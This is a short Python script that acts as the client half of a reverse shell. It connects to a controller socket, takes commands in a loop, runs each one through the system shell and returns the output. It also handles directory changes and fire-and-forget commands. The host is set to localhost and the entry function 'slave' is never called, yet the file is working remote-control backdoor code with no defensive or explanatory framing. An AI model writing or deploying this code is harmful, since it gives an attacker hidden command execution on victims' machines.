#!/usr/bin/env python3

import os
import socket
import subprocess

HEADER = 64
HOST = "127.0.0.1"
PORT = 50505


def send_output(output: str, sock: socket.socket) -> None:
    output_length = len(output)
    send_output_length = str(output_length).encode()
    send_output_length += b' ' * (HEADER - len(send_output_length))
    sock.send(send_output_length)
    sock.send(output.encode())


def execute_command(command: str, sock: socket.socket) -> None:
    output = b""

    try:
        if command.startswith("!"):
            subprocess.run(command[1:], shell=True)

        elif command.startswith("cd"):
            output = change_directory(command)

        else:
            output = subprocess.run(
                command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
            ).stdout

    except Exception as e:
        send_output(str(e), sock)

    send_output(output.decode(), sock)


def change_directory(command: str) -> bytes:
    if not command[3:]:
        current_path = os.path.sep
        os.chdir(current_path)
    else:
        current_path = os.path.join(os.getcwd(), command[3:])
        os.chdir(current_path)

    return current_path.encode()


def receive_command(sock: socket.socket) -> None:
    while True:
        command_length = int(sock.recv(HEADER).decode())
        command = sock.recv(command_length).decode()
        execute_command(command, sock)


def establish_connection() -> socket.socket:
    client_socket = socket.socket()
    client_socket.connect((HOST, PORT))
    return client_socket


def slave():
    client_socket = establish_connection()
    receive_command(client_socket)

